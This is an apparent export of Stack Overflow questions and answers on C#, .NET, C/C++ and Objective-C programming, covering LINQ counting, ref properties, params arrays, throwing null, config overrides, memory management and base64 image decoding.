<p><strong>UPDATE</strong>: Apparently, it's not clear that it's perfectly possible to implement <code>Select</code> and <code>Count</code> so that <code>Select</code>s on <code>ICollection&lt;T&gt;</code> will still be lazily evaluated but the <code>Count()</code> will be evaluated in O(1) without enumerating the collection. I'm going to do that without changing the interface of any methods. A similar thing is already done for <code>ICollection&lt;T&gt;</code>:</p>

<pre><code>private interface IDirectlyCountable {
    int Count {get;}
}
private class SelectICollectionIterator&lt;TSource,TResult&gt; : IEnumerable&lt;T&gt;, IDirectlyCountable {
     ICollection&lt;TSource&gt; sequence;
     Func&lt;TSource,TResult&gt; selector;
     public SelectICollectionIterator(ICollection&lt;TSource&gt; source, Func&lt;TSource,TResult&gt; selector) {
         this.sequence = source;
         this.selector = selector;
     }
     public int Count { get { return sequence.Count; } }
     // ... GetEnumerator ... 
}
public static IEnumerable&lt;TResult&gt; Select&lt;TSource,TResult&gt;(this IEnumerable&lt;TSource&gt; source, Func&lt;TSource,TResult&gt; selector) {
    // ... error handling omitted for brevity ...
    if (source is ICollection&lt;TSource&gt;)
       return new SelectICollectionIterator&lt;TSource,TResult&gt;((ICollection&lt;TSource&gt;)source, selector);
    // ... rest of the method ...
}
public static int Count&lt;T&gt;(this IEnumerable&lt;T&gt; source) {
    // ...
    ICollection&lt;T&gt; collection = source as ICollection&lt;T&gt;;
    if (collection != null) return collection.Count;
    IDirectlyCountable countableSequence = source as IDirectlyCountable;
    if (countableSequence != null) return countableSequence.Count;
    // ... enumerate and count the sequence ...
}
</code></pre>

<p>This will still evaluate the <code>Count</code> lazily. If you change the underlying collection, the count will get changed and the sequence is not cached. The only difference will be not doing the side effects in the <code>selector</code> delegate.</p>
"
"<h2>This is issue about LANGUAGE DESIGN.</h2>

<p>Please do not answer to the question until you read entire post! Thank you.</p>

<p>With all helpers existing in C# (like lambdas, or automatic properties) it is very odd for me that I cannot pass property by a reference. Let's say I would like to do that:</p>

<pre><code>foo(ref my_class.prop);
</code></pre>

<p>I get error so I write instead:</p>

<pre><code>{
   var tmp = my_class.prop;
   foo(tmp);
   my_class.prop = tmp;
}
</code></pre>

<p>And now it works. But please notice two things:</p>

<ol>
<li><p>it is general template, I didn't put anywhere type, only ""var"", so it applies for all types and number of properties I have to pass</p></li>
<li><p>I have to do it over and over again, with no benefit -- it is mechanical work</p></li>
</ol>

<p>The existing problem actually kills such useful functions as Swap. Swap is normally 3 lines long, but since it takes 2 references, calling it takes 5 lines. Of course it is nonsense and I simply write ""swap"" by hand each time I would like to call it. But this shows C# prevents reusable code, bad.</p>

<h2>THE QUESTION</h2>

<p>So -- what bad could happen if compiler automatically create temporary variables (as I do by hand), call the function, and assign the values back to properties? Is this any danger in it? I don't see it so I am curious what do you think why the design of this issue looks like it looks now.</p>

<p>Cheers,</p>

<p><strong>EDIT</strong> As 280Z28 gave great examples for beating idea of automatically wrapping ref for properties I still think wrapping properties with temporary variables would be useful. Maybe something like this:</p>

<pre><code>Swap(inout my_class.prop1,inout my_class.prop2);
</code></pre>

<p>Otherwise no real Swap for C# :-(</p>
","33708","","<p>I'll provide just one simple example where it would cause confusion. Assume it was possible (as is in VB):</p>

<pre><code>class Weird {
   public int Prop { get; set; }
}

static void Test(ref int x) {
   x = 42;
   throw new Exception();
}

static void Main() { 
   int v = 10;
   try {
      Test(ref v);
   } catch {}
   Console.WriteLine(v); // prints 42

   var c = new Weird();
   c.Prop = 10;
   try {
      Test(ref c.Prop);
   } catch {}
   Console.WriteLine(c.Prop); // prints 10!!!
}
</code></pre>

<p>Nice. Isn't it?</p>
"
"<p>Given an array of strings, how do I create another array that has another entry inserted at initialisation time?</p>

<p>Eg. I want to do something like this:</p>

<p>var newArrayOfStrings = new string[] { ""inserted entry"", anotherArrayOfStrings }</p>

<p>(I know I can do this by getting a count and then copying; but I think it should be possible to do this at initialisation time.)</p>
","33708","","<p>No, there's no special syntax for doing that. You'll need to do the copying in one way or another:</p>

<pre><code>var newArrayOfStrings = 
        new[] { ""inserted entry"" }.Concat(anotherArrayOfStrings).ToArray();
</code></pre>

<p><sub>Performance-wise, this can be slower than <code>Array.Copy</code> but the syntax is cleaner.</sub></p>
"
"<p>Let's say I have a collection of thousands of objects, all of which implement the following:</p>

<pre><code>public event EventHandler StatusChanged = (s,e) =&gt; {};
private void ChangeStatus()
{
  StatusChanged(this, new EventArgs());
}
</code></pre>

<p>If no handlers are subscribed to that event for each object, does using the no-op event handler provide any performance drawbacks?  Or is the CLR smart enough to ignore it?  Or am I better off checking for a <code>StatusChanged</code> handler before firing the event?</p>
","33708","","<p>Yes, the CLR is not really smart enough to ignore it but the difference should be negligible in most cases. </p>

<p>A method call is not a big deal and is unlikely to have a meaningful impact on the performance of your application.</p>
"
"<p>If I call AddMonths on a DateTime object using an int that is too large, I get an ArgumentException thrown in my face with a polite message that says, </p>

<p>""The added or subtracted value results in an un-representable DateTime. 
Parameter name: months""</p>

<p>What check should I do on the months argument before calling this method?</p>
","33708","","<p>Wrap the <code>AddMonths</code> method in a <code>try</code> block if you're anticipating such a problem.</p>
"
"<p>In <code>Visual Studio &gt; Build &gt; Configuration Manager</code> you can choose the target platform.</p>

<p>What does it change?</p>

<p>Is there any other way I can optimize my .NET app when targeting x64 platforms?</p>
","33708","","<p>It doesn't ""optimize"" your app for 64-bit platforms. .NET assemblies will contain IL which is platform-independent by definition regardless of that setting. That setting simply flips a flag in the target assembly and makes it run on the specific version of the runtime.</p>
"
"<p>I was provided this simple C++ [I think] program to investigate the maximum size of int that can be stored:</p>

<pre><code>#include &lt;limits.h&gt;
#include &lt;iostream&gt;

void main ( int argc , char * argv[])

{

  cout &lt;&lt; ""INT_MAX      "" &lt;&lt; INT_MAX   &lt;&lt; endl ;
  cout &lt;&lt; ""INT_MAX +1 = "" &lt;&lt; INT_MAX + 1  &lt;&lt; endl ;
  cout &lt;&lt; ""INT_MAX -1 = "" &lt;&lt; INT_MAX - 1 &lt;&lt; endl ;

  cout &lt;&lt; ""INT_MAX / INT_MAX        "" &lt;&lt; INT_MAX /INT_MAX &lt;&lt; endl ;
  cout &lt;&lt; ""(INT_MAX +1) / INT_MAX   "" &lt;&lt; (INT_MAX +1) /INT_MAX &lt;&lt; endl;
  cout &lt;&lt; ""(INT_MAX -1) / INT_MAX   "" &lt;&lt; (INT_MAX -1) /INT_MAX  &lt;&lt;endl;
  cout &lt;&lt; ""INT_MAX / (INT_MAX +1)   "" &lt;&lt; INT_MAX  /(INT_MAX+1)  &lt;&lt;endl;
  cout &lt;&lt; ""INT_MAX / (INT_MAX -1)   "" &lt;&lt; INT_MAX  /(INT_MAX -1)  &lt;&lt;endl;

}
</code></pre>

<p>I'm attempting to compile with:</p>

<pre><code>gcc -o int_max int_max.cpp
</code></pre>

<p>But I get the following error:</p>

<pre><code>int_max.cpp:4: error: '::main' must return 'int'
int_max.cpp: In function 'int main(int, char**)':
int_max.cpp:8: error: 'cout' was not declared in this scope
int_max.cpp:8: error: 'endl' was not declared in this scope
int_max.cpp:9: warning: integer overflow in expression
int_max.cpp:13: warning: integer overflow in expression
int_max.cpp:15: warning: integer overflow in expression
</code></pre>

<p>I tried adding a return 0 at the end of main but that didn't help.  Any idea what I've done wrong?</p>

<p>P.S It's possible this is actually a C snippet but I seem to remember the lecturer saying it was C++.</p>

<p>Cheers</p>
","33708","","<p>You are compiling C++ code with <code>gcc</code> in a file with <code>.c</code> extension?</p>

<pre><code>// Use new C++ header files instead of their .h version.
#include &lt;climits&gt;
#include &lt;iostream&gt;

// cout and endl are declared in the std namespace.
using namespace std;

int main (int argc, char * argv[])    
{
  cout &lt;&lt; ""INT_MAX      "" &lt;&lt; INT_MAX   &lt;&lt; endl ;
  cout &lt;&lt; ""INT_MAX +1 = "" &lt;&lt; INT_MAX + 1  &lt;&lt; endl ;
  cout &lt;&lt; ""INT_MAX -1 = "" &lt;&lt; INT_MAX - 1 &lt;&lt; endl ;

  cout &lt;&lt; ""INT_MAX / INT_MAX        "" &lt;&lt; INT_MAX /INT_MAX &lt;&lt; endl ;
  cout &lt;&lt; ""(INT_MAX +1) / INT_MAX   "" &lt;&lt; (INT_MAX +1) /INT_MAX &lt;&lt; endl;
  cout &lt;&lt; ""(INT_MAX -1) / INT_MAX   "" &lt;&lt; (INT_MAX -1) /INT_MAX  &lt;&lt;endl;
  cout &lt;&lt; ""INT_MAX / (INT_MAX +1)   "" &lt;&lt; INT_MAX  /(INT_MAX+1)  &lt;&lt;endl;
  cout &lt;&lt; ""INT_MAX / (INT_MAX -1)   "" &lt;&lt; INT_MAX  /(INT_MAX -1)  &lt;&lt;endl;

  return 0;
}
</code></pre>

<p>and use <code>g++</code> to compile.</p>
"
"<p>In my college days I read about the <code>auto</code> keyword and in the course of time I actually forgot what it is. It is defined as: </p>

<blockquote>
  <p>defines a local variable as having a
  local lifetime</p>
</blockquote>

<p>I never found it is being used anywhere, is it really used and if so then where is it used and in which cases?</p>
","33708","","<p><code>auto</code> is a modifier like <code>static</code>. It defines the storage class of a variable. However, since the default for local variables is <code>auto</code>, you don't normally need to manually specify it.</p>

<p><a href=""http://web.archive.org/web/20130927234242/http://itee.uq.edu.au/~comp2303/Leslie_C_ref/C/CONCEPT/storage_class.html"" rel=""nofollow"">This page</a> lists different storage classes in C.</p>
"
"<ol>
<li><p>I heard F# has native support for immutability but what about it that can not be replicated in C#? What do you get by an F# immutable data that you don't get from a C# immutable data?</p></li>
<li><p>Also in F#, is there no way to create mutable data? Is everything immutable?</p></li>
<li><p>If you use both C# and F# in an application, can you change the immutable F# data in C#? Or do you just have to create new C# types that uses the immutable F# data and replaces the references that points to those data?</p></li>
</ol>
","33708","","<ol>
<li><p>The way F# works makes it easier to work with immutable data but there's nothing special that can't be done in C# in that regard. It may not provide neat syntax though.</p></li>
<li><p>F# supports mutable data with the <code>mutable</code> keyword. F# is not a pure functional language. It supports imperative constructs like loops as well as functional constructs.</p></li>
<li><p>No. Immutable types are really immutable. The .NET type system is shared across both languages. You can't change the immutable data from C# either (short of reflection and memory hacks, of course).</p></li>
</ol>
"
"<p>I have class Foo.  Foo has a property of public string x.</p>

<p>I would like to instantiate Foo a few times as ONE and TWO, and add those instances to Hashtable Bar with keys 1 and 2 respectively.  How do I obtain string x for the particular instance.</p>

<p>I've tried something to the like of:  Bar[1].x, but the property x is not recognized.</p>

<p>What am I doing wrong?</p>
","33708","","<p>You should be using <code>Dictionary&lt;int, Foo&gt;</code> instead of <code>Hashtable</code>.  <code>Hashtable</code> is an obsolete class for the days we didn't have generics. It stores key and values as <code>object</code> type. <code>Dictionary&lt;TKey,TValue&gt;</code>, on the other hand, is a strongly typed generic collection.</p>

<p>If you want to use <code>Hashtable</code> for some reason (e.g. C# 1.0), you'll have to cast the object:</p>

<pre><code> ((Foo)Bar[1]).x
</code></pre>
"
"<p>While writing some particularly complex exception handling code, someone asked, don't you need to make sure that your exception object isn't null?  And I said, of course not, but then decided to try it.  Apparently, you can throw null, but it is still turned into an exception somewhere.</p>

<p>Why is this allowed?</p>

<pre><code>throw null;
</code></pre>

<p>In this snippet, thankfully 'ex' is not null, but could it ever be?</p>

<pre><code>try
{
  throw null;
}
catch (Exception ex)
{
  //can ex ever be null?

  //thankfully, it isn't null, but is
  //ex is System.NullReferenceException
}
</code></pre>
","33708","","<p>Because the language specification expects an expression of type <code>System.Exception</code> there (therefore, <code>null</code> is a valid in that context) and doesn't restrict this expression to be non-null. In general, there's no way it could detect whether the value of that expression is <code>null</code> or not. It would have to solve the halting problem. The runtime will have to deal with the <code>null</code> case anyway. See:</p>

<pre><code>Exception ex = null;
if (conditionThatDependsOnSomeInput) 
    ex = new Exception();
throw ex; 
</code></pre>

<p>They could, of course, make the specific case of throwing the <code>null</code> literal invalid but that wouldn't help much, so why waste specification space and reduce consistency for little benefit?</p>

<p><sub>Disclaimer (before I get slapped by Eric Lippert): This is <em>my own</em> speculation about the reasoning behind this design decision. Of course, I haven't been in the design meeting ;)</sub> </p>

<hr>

<p>The answer to your second question, whether an expression variable caught within a catch clause can ever be null: While the C# specification is silent about whether other languages can cause a <code>null</code> exception to be propagated, it does define the way exceptions are propagated:</p>

<blockquote>
  <p>The catch clauses, if any, are examined in order of appearance to locate a suitable handler for the exception. The first catch clause <strong>that specifies the exception type or a base type of the exception type</strong> is considered a match. A general catch clause is considered a match for any exception type. [...]</p>
</blockquote>

<p>For <code>null</code>, the bold statement is false. So, while purely based on what the C# spec says, we can't say the underlying runtime won't ever throw null, we can be sure that even if that's the case, it'll be only handled by the generic <code>catch {}</code> clause.  </p>

<p>For C# implementations on the CLI, we can refer to the ECMA 335 specification. That document defines all exceptions that the CLI throws internally (none of which are <code>null</code>) and mentions that user defined exception objects are thrown by the <code>throw</code> instruction. The description for that instruction is virtually identical to C# <code>throw</code> statement (except that it doesn't restrict the type of the object to <code>System.Exception</code>): </p>

<blockquote>
  <h3>Description:</h3>
  
  <p>The <code>throw</code> instruction throws the exception object (type <code>O</code>) on the stack and empties the stack. For details of the exception mechanism, see Partition I.<br>
  [Note: While the CLI permits any object to be thrown, the CLS describes a specific exception class that shall be used for language interoperability. end note]  </p>
  
  <h3>Exceptions:</h3>
  
  <p><code>System.NullReferenceException</code> is thrown if <code>obj</code> is <code>null</code>.</p>
  
  <h3>Correctness:</h3>
  
  <p>Correct CIL ensures that object is always either <code>null</code> or an object reference (i.e., of type <code>O</code>).</p>
</blockquote>

<p>I believe these are sufficient to conclude caught exceptions are never <code>null</code>.</p>
"
"<p>I've been looking at the SDK3.2 to find out about the new capacity to direct call over IP on 3G network, but I don't see anything obvious in the API diffs. Is this just something Apple allows on a low level private framework or does it reflect on the public frameworks as well? if so, which framework, class, method?</p>

<p>thanks for you help</p>
","33708","","<p>I don't think this is something Apple enforced at the API level. It's not easy to distinguish an encrypted VoIP data stream from other kinds of encrypted data and you could circumvent such a restriction very easily. They required the VoIP applications to enforce it themselves to get past the App Store review. They simply won't enforce this restriction on apps anymore. Actually, some apps already work on 3G without an OS update.</p>
"
"<p>In ASP.NET,How can i know the Specific details about an exception (like What kind of Exception it is (FileNotFound /Arithmentc etc..) )from a General Exception class object </p>
","33708","","<p>You can use <code>GetType()</code> method to get the actual type of the exception instance.</p>

<p>If you are interested in some property of a specific type of exception and you're sure about the type, just cast the exception to the type and fetch the property value.</p>

<p>Alternatively, you can <a href=""http://stackoverflow.com/questions/824802/c-how-to-get-all-public-both-get-and-set-string-properties-of-a-type"">use reflection to interrogate the object and retrieve all of its properties</a>.</p>
"
"<p>I learn to work with the built-in profile provider of .Net, and have the following
problem:</p>

<p>I read that the machine.config-settings can be overridden by the web.config-settings
of a .Net-Application. The following settings in the machine.config-file are relevant
for me:</p>

<pre><code>&lt;connectionStrings&gt;
&lt;add name=""LocalSqlServer"" connectionString=""Data Source=(local);Initial Catalog=aspnetdb;
Integrated Security=True"" providerName=""System.Data.SqlClient""/&gt;
&lt;/connectionStrings&gt;

&lt;profile&gt;&lt;providers&gt;&lt;add name=""AspNetSqlProfileProvider""connectionStringName=""LocalSqlServer"" applicationName=""/"" type=""System.Web.Profile.SqlProfileProvider, System.Web, Version=2.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a""/&gt;&lt;/providers&gt;&lt;/profile&gt;
</code></pre>

<p>These settings work to set up local profiles.
However, when I copy the settings into the web.config of my application and change the
machine.config settings, so that they donÂ´t work any more, I get a configuration
error.
For example, I change the name of the provider in the machine.config to ""Local"".
This should be no problem, because the settings are overridden. However, when running
the application I get the error:</p>

<p>""The entry ""AspNetSQLProvider has already been added"" (my translation)</p>
","33708","","<p>Add a <code>&lt;clear /&gt;</code> element as the first child of <code>&lt;connectionStrings&gt;</code>. It'll cause the configuration system to ignore all connection strings added in <code>machine.config</code> and use the new ones provided. You can also use <code>&lt;remove&gt;</code> element to remove a single configuration item if you don't want to clear out the whole thing.</p>

<pre><code>&lt;connectionStrings&gt;
   &lt;clear /&gt;
   &lt;add name=""LocalSqlServer"" connectionString=""Data Source=(local);Initial Catalog=aspnetdb;Integrated Security=True"" providerName=""System.Data.SqlClient""/&gt; 
&lt;/connectionStrings&gt;
</code></pre>

<p>The same idea applies to <code>&lt;providers&gt;</code> sections as well.</p>
"
"<p>Can I compile a WebSite project(3.5) using utility aspnet_compiler from command line without installing IIS if I am using local web server for development? </p>

<p>Thanks</p>
","33708","","<p>Yes, you can. You'll have to specify the virtual path you'll host it on the server though:</p>

<pre><code>aspnet_compiler -v /deploymentVirtualPath -p D:\InputWebSite D:\CompiledWebsite
</code></pre>

<p>This will compile the Web site in ""D:\InputWebsite"" to ""D:\CompiledWebsite"" and expects it to get deployed in ""/deploymentVirtualPath"" virtual path on the production server. If you need to deploy it in the Website root, just specify ""/"" as the virtual path.</p>
"
"<p>If I have a function </p>

<pre><code>void Foo(params int[] bar){}
</code></pre>

<p>The following runs fine:</p>

<pre><code>int[] a1 = {1, 2, 3};
int[] a2 = {4, 5, 6};
Foo(1, 2, 3);
Foo(a1);
</code></pre>

<p>But these give compile errors:</p>

<pre><code>Foo(a1, 1, 2, 3);
Foo(1, 2, a1);
Foo(1, a1, 2);
Foo(a1, a2, 1, 2, 3);
</code></pre>

<p>because only the first argument is allowed to be an int[], the rest have to be ints.</p>

<p>The final example is what I would like to do, but the language won't let me without combining the arrays first. I really like the simplicity of the syntax, and I would rather not add to the code more than I have to. Does anyone have a nice way to do this?</p>
","33708","","<p>It's weird. <code>Foo(a1, 2, 3)</code> shouldn't work. You should either pass an array or a bunch of integers. You can't mix them AFAIK. Do you have another overload or something?</p>

<p>There's not really a neat syntax for doing that. The most concise one I can think of is:</p>

<pre><code>Foo(a1.Concat(a2).Concat(new[] {1,2,3}).ToArray());
</code></pre>
"
"<p>In C#, what is the best way to get a count of the total number of lines in all the files in a directory and all of its subdirectories?</p>

<p>The obvious answer is to make a recursive function to go through all of the directories and use the strategy from <a href=""http://stackoverflow.com/questions/119559/c-determine-the-number-of-lines-within-a-text-file"">this question</a> to count the lines in each file. Is there a better/easier way?</p>
","33708","","<p>The strategy you described works well. An alternative approach instead of a recursive function (basically DFS) is to use BFS. Something like:</p>

<pre><code>int CountLines(string path)
{
    var queue = new Queue&lt;string&gt;();
    queue.Enqueue(path);
    int count = 0;
    while (queue.Count &gt; 0) {
        string dir = queue.Dequeue();
        foreach (var subdir in Directory.GetDirectories(dir))
            queue.Enqueue(subdir);
        foreach (var file in Directory.GetFiles(dir))
            count += GetLineCount(file); 
    }
    return count;
}
</code></pre>
"
"<p>What's the simplest way to check if anything is listening on net.tcp://localhost:8801/
Preferably using WCF</p>
","33708","","<p>I don't think WCF is the best way to do that. Simply open a <code>Socket</code> (or <code>TcpClient</code>) and try connecting to that endpoint.</p>
"
"<p>I would like to create a list inside another list. How can I do this? </p>

<p>And how do I retrieve values from the list which is inside another list?</p>
","33708","","<p>I'm not sure if I correctly understand your question. Do you want something like this?</p>

<pre><code>var listOfList = new List&lt;List&lt;int&gt;&gt;(); 
listOfList.Add(new List&lt;int&gt;());
listOfList[0].Add(42);
</code></pre>
"
"<p>Is there a way of getting the assembly name from a namespace string?  Eg, get ""mscorlib"" from ""System"".</p>

<p>The reason for my question is I'm creating Boo scripts method-by-method and am required to add namespaces programmatically.  The resulting string in Boo would read:</p>

<pre><code>import System from mscorlib
</code></pre>

<p>I could obviously pass in a collection of import strings, but if I can just pass a list of references, that would be far more scalable!</p>

<p>Many thanks</p>
","33708","","<p>Assembly names and namespace names are totally orthogonal concepts. There are no real relations between them. Short of examining a set of known assemblies to see what namespaces they contain, there's no real way to get assembly name from namespace name. For instance, what would you do if two assemblies (both <code>mscorlib</code> and <code>System.Core</code>) declared a type in the <code>System</code> namespace? </p>
"
"<p>I am using the followign object in my asp.net page</p>

<pre><code>private static Dictionary&lt;string, List&lt;Guid&gt;&gt; OpenNodes = new Dictionary&lt;string,    List&lt;Guid&gt;&gt;();  
//Page start
if(!OpenNodes.ContainsKey(Session.SessionID))  
{  
    List&lt;Guid&gt; list = new List&lt;Guid&gt;();  
    OpenNodes.Add(Session.SessionID, list);  
}

//User clicked on a node
Guid id = new Guid(e.Node.Value);  
tmpList = OpenNodes[Session.SessionID];  
tmpList.Add(id);  
OpenNodes[Session.SessionID] = tmpList;  
</code></pre>

<p>Is it agood practive or is there a similar 'better' way to achieve the same?</p>
","33708","","<p>You should not replace <code>Session</code> with static fields. <code>Session</code> is much more flexible and less error-prone. You can easily make it work in Web farms (you can't do that with static fields). You can consider replacing some <code>Application</code> variables with static fields. It's important to know that static fields don't provide any thread safety mechanism out of the box and you should manually control (lock) them appropriately.</p>
"
"<p>Converting a C# project to VB.NET, C# projects start off with <code>namespace Foo {</code> in each class. Is it possible to have the same behaviour in VB.NET?</p>

<p>The problem is VB.NET already creates a namespace with the project name that is hidden, so if you do <code>Namespace Foo</code> in VB.NET you end up with all your stuff in the namespace Foo.Foo</p>
","33708","","<p>Yep. Just clear out the ""Root Namespace"" textbox in the project settings.</p>

<p>If you are compiling from the command line, don't pass a <code>/rootnamespace:</code> switch to the compiler.</p>
"
"<p>I designed the following test:</p>

<pre><code>var arrayLength=5000;
object[] objArray=new object[arrayLength];

for(var x=0;x&lt;arrayLength;x++)
{
    objArray[x]=new object();
}
objArray[4000]=null;
const int TestSize=int.MaxValue;

System.Diagnostics.Stopwatch v= new Stopwatch();
v.Start();
for(var x=0;x&lt;10000;x++)
{
    objArray.Contains(null);
}
v.Stop();
objArray.Contains(null).Dump();
v.Elapsed.ToString().Dump(""Contains"");

//Any ==
v.Reset();
v.Start();
for(var x=0;x&lt;10000;x++)
{
    objArray.Any(o=&gt;o==null);
}
v.Stop();
objArray.Any(x=&gt;x==null).Dump();
v.Elapsed.ToString().Dump(""Any"");

//Any Equals
v.Reset();
v.Start();
for(var x=0;x&lt;10000;x++)
{
    objArray.Any(obj=&gt;object.Equals( obj,null));
}
v.Stop();
objArray.Any(obj=&gt;object.Equals( obj,null)).Dump();
v.Elapsed.ToString().Dump(""Any"");
</code></pre>

<p>The results when null is not present:</p>

<ul>
<li><code>Contains False 00:00:00.0606484</code></li>
<li><code>Any == False 00:00:00.7532898</code></li>
<li><code>Any  object.Equals False 00:00:00.8431783</code></li>
</ul>

<p>When null is present at element 4000:</p>

<ul>
<li><code>Contains  True 00:00:00.0494515</code></li>
<li><code>Any == True 00:00:00.5929247</code></li>
<li><code>Any object.Equals True 00:00:00.6700742</code></li>
</ul>

<p>When null is present at element 10:</p>

<ul>
<li><code>Contains True 00:00:00.0038035</code></li>
<li><code>Any == True 00:00:00.0025687</code></li>
<li><code>Any True 00:00:00.0033769</code></li>
</ul>

<p>So when the object is near the front, <code>Any</code> is slightly faster; when it's at the back, it's much much slower. Why?</p>
","33708","","<p><code>Any</code> will have to call a delegate for every element it checks (an extra <code>callvirt</code> instruction which is unlikely to get inlined by the JIT). <code>Contains</code> only performs that check.  That's why <code>Any</code> is slower.  I suspect the fact that <code>Any</code> looks faster than contains when the element is seen very early is that the benchmark can't reflect it easily since they are very close. The setup time for the method call is the majority of the work done in that case (rather than the actual searching operation).</p>

<pre><code>The anonymous method:
--- C:\Users\Mehrdad\AppData\Local\Temporary Projects\ConsoleApplication1\Program.cs 
            Console.WriteLine(s.Any(a =&gt; a == 1));
00000000  xor         eax,eax 
00000002  cmp         ecx,1 
00000005  sete        al 
00000008  ret 

Relevant part of Enumerable.Any code:
...
00000051  mov         edx,eax 
00000053  mov         rcx,qword ptr [rbx+8] 
00000057  call        qword ptr [rbx+18h]   // calls the anonymous method above
0000005a  movzx       ecx,al 
0000005d  test        ecx,ecx 
...
</code></pre>
"
"<p>I've not had the Kernighan and Ritchie C reference in years, but I remember that there was a page in there that talked about how to enter characters that were unavailable to you.  (WAY back in the day, some keyboards lacked characters like "", ~, etc.)</p>

<p>To be clear, let me give an example.  I'm <strong><em>not</em></strong> looking for a way to get quotes in strings, but rather, I want to replace this:</p>

<pre><code>printf(""foo"");
</code></pre>

<p>with this:</p>

<pre><code>printf([alternate sequence]foo[alternate sequence]);
</code></pre>

<p>For the curious, I have an automated process that involves generating C/C++ code, but the (closed source) commercial tool involved strips quotes in its data streams and the documentation is quite clear on the fact that they do not provide a way to escape them. </p>

<p>EDIT:</p>

<p>Wow, I hadn't expected such a heavy response.  This might merit a little more detail on my process.  I'm doing automated build systems, which means that I live with certain restrictions when it comes to changing the code I'm compiling.  For now, we have to live with the assumption that I have to get a string, spaces and all, into a preprocessor definiton.  I already went down the <a href=""http://stackoverflow.com/questions/2016697/msbuild-exe-not-accepting-either-pdefineconstants-nor-ppreprocessordefinition"">'PreprocessorDefinition' road</a>.  This left me with my usual fallback:  Define the string in the operating environment and have the project file set the definition from there:</p>

<pre><code>Preprocessor Definitions     WIN32;_DEBUG;THINGIE=$(THINGIE)
</code></pre>

<p>The hope was that I could get around MSVC's stripping of quotes in anything handed to the build with /D using a trigraph, by doing something like this in my build automation script:</p>

<pre><code>ENV['THINGIE'] = ""??''Yodeling Monkey Nuggets??''""
run_msbuild_command
</code></pre>

<p>I guess it's time for a plan C.</p>
","33708","","<p>You are looking for a <a href=""http://en.wikipedia.org/wiki/Digraphs_and_trigraphs"" rel=""nofollow"">trigraph</a> for <code>""</code> character? I don't think one exists.</p>

<p>Trigraphs don't exist for all characters. Only a few characters have trigraph sequences. </p>
"
"<p>I recently noticed the following code which basically defines a class method</p>

<pre><code>public Func&lt;string, string&gt; SampleMethod = inputParam =&gt;
{
    return inputParam.ToUpper();
};
</code></pre>

<p>which is the same as doing it in the old fashioned way </p>

<pre><code>public string SampleMethod(string inputParam ) 
{
    return inputParam.ToUpper();
}
</code></pre>

<p>My question - why would I prefer the first over the second? My eyes are maybe more trained to understand the second style quicker. I find it similar to the difference between SMS lingo and plain old english.</p>
","33708","","<p>Those two things are <strong>fundamentally different</strong>. The former is a <em>field</em> of a delegate type while the latter is really a method. The tiniest difference I can think of is that you can modify the first one dynamically at runtime and assign another method reference to it while the second is fixed.</p>

<p>You shouldn't normally prefer the first over the second if your purpose is to write a simple method for a class in C#.</p>

<p>An example that makes the first extremely fragile:</p>

<pre><code>var c = new SomeClass();
c.SampleMethod = inputParam =&gt; inputParam.ToLower();
c.DoSomeTaskThatReliesOnSampleMethodReturningAnUpperCaseString();
c.SampleMethod = null;
c.DoSomeTaskThatCallsSampleMethod(); // NullReferenceException
</code></pre>

<p>This style of programming is common in language like Javascript where an object is fundamentally a dynamic creature built upon a simple dictionary.</p>
"
"<p>I'm a little confused as to the mechanics of the copy constructor. Correct me if I'm wrong: </p>

<p>If a method takes a reference to an object as a parameter, and the class defines a copy construtor, then the class uses the constructor to create a copy of itself and that gets passed to the function instead of a reference to the original object? </p>

<p>Furthermore, one can call </p>

<pre><code>Object * obj = new Object(&amp;anotherObject);
</code></pre>

<p>to create a copy of anotherObject? </p>
","33708","","<p><strong>If a method takes a reference to an object as a parameter</strong>, copy constructor will not be called. If that was the case, then a call to the copy constructor itself would have resulted in an infinite loop (since it takes a reference as an argument).</p>

<p>That line is not a valid way to call a copy constructor. It expects a reference as an argument, not a pointer.</p>
"
"<p>Given the next code snippet:</p>

<p>...</p>

<pre><code>- (void) setTotalAmount: (NSNumber*)input
{
    [totalAmount autorelease];
    totalAmount = [input retain];
}

- (void) dealloc
{
    [totalAmount release];
    [super dealloc];
}
</code></pre>

<p>...</p>

<p>What I want to understand how really we set value.
We allocate local (instance) var and ""retain"" to input var. But what is ""input""? Is it a pointer to real value? Or is it value itself?
When we ""retain"" do we get a pointer to ""input"" or pointer to value or just the value?</p>

<p>And pretty same questions with dealloc and release. What actually ""dies"" here?</p>

<p>Thank you!</p>
","33708","","<p>It's clear that <code>input</code> is a pointer. You have declared its type in the argument list as <code>NSNumber*</code>. </p>

<p><code>input</code> is a pointer to an object of type <code>NSNumber</code>. Internally, the object has an integer variable that holds the number of external references to it. Sending the <code>retain</code> message to an object will increment its reference count. Sending the <code>release</code> message will decrement the count. Sending the <code>autorelease</code> message will adds the object to the local autorelease pool which will keep track of autoreleased objects and sends the <code>release</code> message to them next time it drains. An object with reference count of 1 that receives a <code>release</code> message will get deallocated and its <code>dealloc</code> method will get called. You should release all the resources you hold when you are deallocated.</p>

<p>When you are setting a property, you want to release the old value and make sure the new value is kept around as long as the object itself is alive. To make sure the new value is kept around, you increment its reference count by 1 by sending it the <code>retain</code> message. To release the old object, you'll send it the release message. There's one subtle issue here. If the old value is the same as the new value, if you release the old value first and its retain count was 1, it'll get destroyed before you can increment it. That's why you should retain the new value before releasing the old one.</p>
"
"<p>I have the following code that loads data from an xml file. I've done this quite a while back but don't have that code anymore, and this isn't working. (I can successfully write image data to file. But loading it and converting to image object isn't working):</p>

<pre><code>p.Image = Base64ToImage(controlTag.Attributes(""Content"").First().Value); // i call this on button click.
</code></pre>

<p>and...:</p>

<pre><code>public Image Base64ToImage(string base64String)
{
    // Convert Base64 String to byte[]
    byte[] imageBytes = Convert.FromBase64String(base64String);
    MemoryStream ms = new MemoryStream(imageBytes, 0,
      imageBytes.Length);

    // Convert byte[] to Image
    ms.Write(imageBytes, 0, imageBytes.Length);
    Image image = Image.FromStream(ms, true);
    return image;
}
</code></pre>

<p>Can somebody please explain why this isn't displaying the converted image on my Form? I don't get any errors at all... The images just don't show up.</p>

<p>Thank you </p>

<p>bael</p>

<p><b>UPDATE</b>
<hr />
The following code is what's used to write the image data to the xml file:</p>

<pre><code>public string ImageToBase64(Image image, System.Drawing.Imaging.ImageFormat format)
{
    using (MemoryStream ms = new MemoryStream())
    {
        // Convert Image to byte[]
        image.Save(ms, format);
        byte[] imageBytes = ms.ToArray();

        // Convert byte[] to Base64 String
        string base64String = Convert.ToBase64String(imageBytes);
        return base64String;
    }
}
</code></pre>

